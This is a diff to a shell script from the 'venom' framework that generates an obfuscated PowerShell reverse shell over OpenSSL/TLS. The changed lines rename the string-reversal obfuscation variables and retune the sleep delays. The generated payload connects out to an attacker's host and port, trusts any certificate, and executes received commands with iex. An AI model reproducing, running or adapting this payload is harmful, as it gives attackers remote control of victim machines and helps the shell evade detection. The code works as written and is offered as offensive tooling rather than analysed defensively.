@@ -12865,16 +12865,17 @@ fi
 ## Build Reverse TCP Powershell Shell (OpenSSL).
 echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output."${Reset};sleep 2
 echo "<#" > $IPATH/output/$NaM.ps1
-echo "Obfuscated Reverse OpenSSL Shell" >> $IPATH/output/$NaM.ps1
+echo "Obfuscated Reverse TCP OpenSSL Shell" >> $IPATH/output/$NaM.ps1
 echo "Framework: venom v1.0.17 - shinigami" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
-echo "Start-Sleep -Milliseconds 700" >> $IPATH/output/$NaM.ps1
-echo "\$Waudt = \"tneilCpcT.stekcoS.teN\";\$Bin = \$Waudt.ToCharArray();[Array]::Reverse(\$Bin);" >> $IPATH/output/$NaM.ps1
-echo "\$NewObjectCommand = (\$Bin -Join '');\$Microphone = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$Microphone.ToCharArray();" >> $IPATH/output/$NaM.ps1
-echo "[Array]::Reverse(\$CharArray);\$PSArgException = (\$CharArray -Join '');" >> $IPATH/output/$NaM.ps1
+echo "Start-Sleep -Milliseconds 300" >> $IPATH/output/$NaM.ps1
+echo "\$Uudt = \"tneilCpcT.stekcoS.teN\";\$Cert = \$Uudt.ToCharArray();[Array]::Reverse(\$Cert);" >> $IPATH/output/$NaM.ps1
+echo "\$NewObjectComm = (\$Cert -Join '');\$Phone = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$Phone.ToCharArray();" >> $IPATH/output/$NaM.ps1
+echo "[Array]::Reverse(\$CharArray);\$PSArgExc = (\$CharArray -Join '');" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
-echo "\$socket = New-Object \$NewObjectCommand('$lhost', $lport)" >> $IPATH/output/$NaM.ps1
+echo "Start-Sleep -Milliseconds 200" >> $IPATH/output/$NaM.ps1
+echo "\$socket = New-Object \$NewObjectComm('$lhost', $lport)" >> $IPATH/output/$NaM.ps1
 echo "\$stream = \$socket.GetStream()" >> $IPATH/output/$NaM.ps1
 echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/$NaM.ps1
 echo "\$sslStream.AuthenticateAsClient('$CN', \$null, \"Tls12\", \$false)" >> $IPATH/output/$NaM.ps1
@@ -12883,9 +12884,8 @@ echo "        \$writer.Write((pwd).Path + '> ')" >> $IPATH/output/$NaM.ps1
 echo "        \$writer.flush()" >> $IPATH/output/$NaM.ps1
 echo "        [byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
-echo "Start-Sleep -Milliseconds 500" >> $IPATH/output/$NaM.ps1
 echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/$NaM.ps1
-echo "   \$data = (New-Object -TypeName \$PSArgException).GetString(\$bytes,0, \$i);" >> $IPATH/output/$NaM.ps1
+echo "   \$data = (New-Object -TypeName \$PSArgExc).GetString(\$bytes,0, \$i);" >> $IPATH/output/$NaM.ps1
 echo "   \$sendback = (iex \$data | Out-String ) 2>&1;" >> $IPATH/output/$NaM.ps1
 echo "   \$sendback2 = \$sendback + (pwd).Path + '> ';" >> $IPATH/output/$NaM.ps1
 echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);" >> $IPATH/output/$NaM.ps1
